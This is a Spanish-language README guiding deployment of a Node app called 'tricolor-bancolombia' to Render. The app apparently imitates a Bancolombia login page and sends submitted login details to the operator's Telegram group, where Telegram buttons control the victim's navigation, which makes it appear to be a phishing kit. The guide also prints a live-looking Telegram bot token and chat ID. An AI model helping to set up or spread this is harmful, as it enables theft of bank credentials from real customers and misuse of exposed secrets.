# 🚀 Guía de Despliegue en Render

Esta guía te ayudará a desplegar tu aplicación Bancolombia en Render paso a paso.

## 📋 Prerrequisitos

- Cuenta en [Render](https://render.com) (puedes usar GitHub para registrarte)
- Tu código ya está en GitHub: `https://github.com/hanselrosales255/tricolor`
- Token de tu Bot de Telegram
- ID del chat/grupo de Telegram donde recibirás los mensajes

## 🔧 Paso 1: Crear un Nuevo Web Service en Render

1. **Inicia sesión en Render**
   - Ve a [https://dashboard.render.com](https://dashboard.render.com)
   - Inicia sesión con tu cuenta de GitHub

2. **Crear nuevo servicio**
   - Haz clic en el botón **"New +"** en la parte superior
   - Selecciona **"Web Service"**

3. **Conectar tu repositorio**
   - Busca y selecciona el repositorio: `hanselrosales255/tricolor`
   - Si no aparece, haz clic en "Configure account" para dar permisos a Render
   - Haz clic en **"Connect"**

## ⚙️ Paso 2: Configurar el Servicio

En la página de configuración, completa los siguientes campos:

### Configuración Básica

| Campo | Valor |
|-------|-------|
| **Name** | `tricolor-bancolombia` (o el nombre que prefieras) |
| **Region** | `Oregon (US West)` o la más cercana a ti |
| **Branch** | `master` |
| **Root Directory** | (dejar vacío) |
| **Runtime** | `Node` |
| **Build Command** | `npm install` |
| **Start Command** | `npm start` |

### Plan

- Selecciona el plan **Free** (suficiente para empezar)
- ⚠️ **Importante**: Los servicios gratuitos se duermen después de 15 minutos de inactividad

## 🔐 Paso 3: Configurar Variables de Entorno

En la sección **Environment Variables**, agrega las siguientes variables:

| Key | Value | Descripción |
|-----|-------|-------------|
| `PORT` | `3000` | Puerto del servidor |
| `TELEGRAM_BOT_TOKEN` | `8476776117:AAELHdBk6OXxUcI2-QkI7xhtu6HKWeynhZY` | Tu token del bot de Telegram |
| `TELEGRAM_CHAT_ID` | `-1002984980722` | ID del chat/grupo donde recibirás mensajes |
| `SESSION_EXPIRY_TIME` | `1800000` | Tiempo de expiración de sesión (30 min en ms) |
| `NODE_ENV` | `production` | Ambiente de producción |

### 📝 Cómo obtener tu TELEGRAM_BOT_TOKEN:

1. Abre Telegram y busca a **@BotFather**
2. Envía el comando `/newbot`
3. Sigue las instrucciones para crear tu bot
4. Copia el token que te proporciona (formato: `123456789:ABCdefGHIjklMNOpqrsTUVwxyz`)

### 📝 Cómo obtener tu TELEGRAM_CHAT_ID:

**Opción 1: Chat personal con el bot**
1. Busca a tu bot en Telegram y envíale un mensaje (ej: `/start`)
2. Abre en tu navegador: `https://api.telegram.org/bot<TU_TOKEN>/getUpdates`
3. Busca el campo `"id"` dentro de `"chat"` en el JSON
4. Ese número es tu `CHAT_ID` (ej: `123456789`)

**Opción 2: Grupo de Telegram**
1. Agrega tu bot al grupo
2. Envía un mensaje en el grupo mencionando al bot
3. Abre en tu navegador: `https://api.telegram.org/bot<TU_TOKEN>/getUpdates`
4. Busca el campo `"id"` dentro de `"chat"` (será un número negativo, ej: `-1001234567890`)
5. Ese número es tu `CHAT_ID`

## 🚀 Paso 4: Deploy

1. Verifica que todas las variables de entorno estén correctas
2. Haz clic en **"Create Web Service"**
3. Render comenzará a:
   - Clonar tu repositorio
   - Instalar dependencias (`npm install`)
   - Iniciar tu servidor (`npm start`)

## 📊 Paso 5: Monitorear el Deploy

1. Verás los logs en tiempo real
2. Busca mensajes como:
   ```
   🚀 Servidor corriendo en puerto 3000
   ✅ Bot de Telegram conectado
   📡 Socket.IO inicializado
   ```

3. Cuando veas **"Your service is live 🎉"**, tu app estará desplegada

## 🌐 Paso 6: Obtener tu URL

Una vez desplegado, Render te dará una URL como:
```
https://tricolor-bancolombia.onrender.com
```

Esta es la URL pública de tu aplicación. Puedes:
- Compartirla directamente
- Configurar un dominio personalizado (en Dashboard > Settings > Custom Domain)

## 🔄 Actualizaciones Automáticas

Render está configurado para hacer **deploy automático** cada vez que hagas `git push` a la rama `master`.

Para actualizar tu app:
```bash
git add .
git commit -m "Descripción de los cambios"
git push origin master
```

Render detectará los cambios y re-desplegará automáticamente.

## ⚡ Solución de Problemas Comunes

### 1. El servicio se duerme (plan Free)
- **Problema**: Los servicios gratuitos se duermen después de 15 minutos sin uso
- **Síntoma**: Primera carga tarda 30-60 segundos
- **Solución**: Considera usar el plan Starter ($7/mes) para servicio 24/7

### 2. Error "Module not found"
- **Causa**: Falta alguna dependencia
- **Solución**: Verifica que `package.json` tenga todas las dependencias
- **Fix rápido**:
  ```bash
  git add .
  git commit -m "Fix dependencies"
  git push
  ```

### 3. Bot de Telegram no responde
- **Verifica**:
  - `TELEGRAM_BOT_TOKEN` esté correcto (sin espacios)
  - `TELEGRAM_CHAT_ID` sea correcto (con el guion si es grupo)
  - El bot esté agregado al grupo (si usas grupo)
- **Revisar logs**: Dashboard > Logs para ver errores

### 4. Error de conexión Socket.IO
- **Causa**: Configuración de CORS o dominio
- **Solución**: Ya está configurado para aceptar todas las conexiones en producción
- **Verificar**: Que la URL del frontend apunte a tu dominio de Render

### 5. Variables de entorno no se aplican
- **Solución**: 
  1. Ve a Dashboard > Environment
  2. Verifica los valores
  3. Haz clic en "Manual Deploy" > "Clear build cache & deploy"

## 📱 Probar tu App

1. Abre la URL de Render en tu navegador
2. Completa el formulario de login
3. Verifica que llegue el mensaje a tu Telegram
4. Prueba la navegación con los botones de Telegram

## 🎯 Próximos Pasos

- **Dominio Personalizado**: Configura `tupagina.com` en lugar de `*.onrender.com`
- **SSL**: Render incluye SSL gratis automáticamente
- **Monitoreo**: Usa los logs de Render para ver actividad
- **Backups**: Considera hacer backups regulares del código

## 🔗 Enlaces Útiles

- [Dashboard de Render](https://dashboard.render.com)
- [Documentación de Render](https://render.com/docs)
- [Tu repositorio en GitHub](https://github.com/hanselrosales255/tricolor)
- [Telegram Bot API](https://core.telegram.org/bots/api)

---

¿Necesitas ayuda? Revisa los logs en Render o verifica la configuración de tu bot en Telegram.
